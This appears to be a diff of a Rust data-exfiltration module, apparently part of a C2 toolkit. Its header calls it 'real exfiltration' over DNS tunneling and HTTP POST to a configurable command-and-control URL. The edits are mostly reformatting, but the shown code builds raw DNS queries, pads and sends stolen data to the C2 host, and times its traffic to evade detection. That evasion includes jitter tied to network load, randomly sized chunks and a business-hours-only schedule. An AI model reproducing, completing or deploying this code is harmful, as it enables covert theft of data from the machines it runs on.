@@ -1,17 +1,15 @@
 // Real exfiltration: DNS tunneling via raw UDP, HTTP POST to configurable C2.
 // No simulation. Data leaves the machine.
 
+use rand::Rng;
 use std::net::UdpSocket;
 use std::time::Duration;
 use tracing::{info, warn};
-use rand::Rng;
 
 /// Check if network is busy (adaptive jitter).
 fn is_high_traffic() -> bool {
     std::fs::read_to_string("/proc/net/dev")
-        .map(|s| {
-            s.lines().filter(|l| l.contains(':')).count() > 5
-        })
+        .map(|s| s.lines().filter(|l| l.contains(':')).count() > 5)
         .unwrap_or(false)
 }
 
@@ -72,16 +70,18 @@ fn build_dns_query(hostname: &str) -> Vec<u8> {
 
     // DNS header (12 bytes)
     let txid: u16 = rand::thread_rng().gen();
-    packet.extend_from_slice(&txid.to_be_bytes());       // Transaction ID
-    packet.extend_from_slice(&[0x01, 0x00]);              // Flags: standard query
-    packet.extend_from_slice(&[0x00, 0x01]);              // Questions: 1
-    packet.extend_from_slice(&[0x00, 0x00]);              // Answer RRs: 0
-    packet.extend_from_slice(&[0x00, 0x00]);              // Authority RRs: 0
-    packet.extend_from_slice(&[0x00, 0x00]);              // Additional RRs: 0
+    packet.extend_from_slice(&txid.to_be_bytes()); // Transaction ID
+    packet.extend_from_slice(&[0x01, 0x00]); // Flags: standard query
+    packet.extend_from_slice(&[0x00, 0x01]); // Questions: 1
+    packet.extend_from_slice(&[0x00, 0x00]); // Answer RRs: 0
+    packet.extend_from_slice(&[0x00, 0x00]); // Authority RRs: 0
+    packet.extend_from_slice(&[0x00, 0x00]); // Additional RRs: 0
 
     // Question: encode hostname as labels
     for label in hostname.split('.') {
-        if label.len() > 63 { continue; }
+        if label.len() > 63 {
+            continue;
+        }
         packet.push(label.len() as u8);
         packet.extend_from_slice(label.as_bytes());
     }
@@ -108,8 +108,8 @@ pub fn http_exfiltrate(data: &[u8], c2_url: Option<&str>, filename: Option<&str>
     let url = c2_url.unwrap_or_else(|| {
         &*Box::leak(
             std::env::var("HIVE_C2_URL")
-                .unwrap_or_else(|_| "https://localhost:8443/collect".into())
-                .into_boxed_str()
+                .unwrap_or_else(|_| "http://localhost:8444/collect".into())
+                .into_boxed_str(),
         )
     });
 
@@ -128,7 +128,11 @@ pub fn http_exfiltrate(data: &[u8], c2_url: Option<&str>, filename: Option<&str>
     let port = if use_tls { 443 } else { 80 };
 
     // Adaptive jitter: less delay during high network traffic, more when quiet
-    let base_jitter = if is_high_traffic() { 50..=300 } else { 300..=1200 };
+    let base_jitter = if is_high_traffic() {
+        50..=300
+    } else {
+        300..=1200
+    };
     let jitter_ms = rand::thread_rng().gen_range(base_jitter);
     std::thread::sleep(Duration::from_millis(jitter_ms));
 
@@ -161,9 +165,17 @@ pub fn http_exfiltrate(data: &[u8], c2_url: Option<&str>, filename: Option<&str>
             if stream.write_all(request.as_bytes()).is_ok() {
                 let mut response = [0u8; 4096];
                 let _ = std::io::Read::read(&mut stream, &mut response);
-                info!("HTTP exfil: {} bytes (+{} pad) to {} -> {}",
-                    data.len(), pad_len, host,
-                    std::str::from_utf8(&response).unwrap_or("?").lines().next().unwrap_or("?"));
+                info!(
+                    "HTTP exfil: {} bytes (+{} pad) to {} -> {}",
+                    data.len(),
+                    pad_len,
+                    host,
+                    std::str::from_utf8(&response)
+                        .unwrap_or("?")
+                        .lines()
+                        .next()
+                        .unwrap_or("?")
+                );
                 true
             } else {
                 warn!("HTTP exfil: failed to send to {}", host);
@@ -181,8 +193,12 @@ fn extract_host(url: &str) -> String {
     let s = url
         .trim_start_matches("https://")
         .trim_start_matches("http://");
-    s.split('/').next().unwrap_or("localhost")
-        .split(':').next().unwrap_or("localhost")
+    s.split('/')
+        .next()
+        .unwrap_or("localhost")
+        .split(':')
+        .next()
+        .unwrap_or("localhost")
         .to_string()
 }
 
@@ -212,22 +228,32 @@ fn base64_encode(data: &[u8]) -> String {
         let triple = (b0 << 16) | (b1 << 8) | b2;
         result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
         result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
-        result.push(if chunk.len() > 1 { CHARS[((triple >> 6) & 0x3F) as usize] as char } else { '=' });
-        result.push(if chunk.len() > 2 { CHARS[(triple & 0x3F) as usize] as char } else { '=' });
+        result.push(if chunk.len() > 1 {
+            CHARS[((triple >> 6) & 0x3F) as usize] as char
+        } else {
+            '='
+        });
+        result.push(if chunk.len() > 2 {
+            CHARS[(triple & 0x3F) as usize] as char
+        } else {
+            '='
+        });
     }
     result
 }
 
 // ── Traffic Scheduler (REAL) ─────────────────────────────────────────────────
 
-use chrono::{Local, Timelike, Datelike, Weekday};
+use chrono::{Datelike, Local, Timelike, Weekday};
 
 pub fn is_business_hours() -> bool {
     let now = Local::now();
     let hour = now.hour();
     let wd = now.weekday();
-    matches!(wd, Weekday::Mon | Weekday::Tue | Weekday::Wed | Weekday::Thu | Weekday::Fri)
-        && (8..=18).contains(&hour)
+    matches!(
+        wd,
+        Weekday::Mon | Weekday::Tue | Weekday::Wed | Weekday::Thu | Weekday::Fri
+    ) && (8..=18).contains(&hour)
 }
 
 pub struct ExfilScheduler {
@@ -256,7 +282,8 @@ impl ExfilScheduler {
         let mut schedule = Vec::new();
         let mut offset = 0;
         while offset < data.len() {
-            let chunk_size = rng.gen_range(self.min_chunk_size..=self.max_chunk_size)
+            let chunk_size = rng
+                .gen_range(self.min_chunk_size..=self.max_chunk_size)
                 .min(data.len() - offset);
             let chunk = data[offset..offset + chunk_size].to_vec();
             let delay = rng.gen_range(self.min_delay_ms..=self.max_delay_ms);
@@ -267,6 +294,10 @@ impl ExfilScheduler {
     }
 
     pub fn should_exfiltrate(&self) -> bool {
-        if self.business_hours_only { is_business_hours() } else { true }
+        if self.business_hours_only {
+            is_business_hours()
+        } else {
+            true
+        }
     }
 }
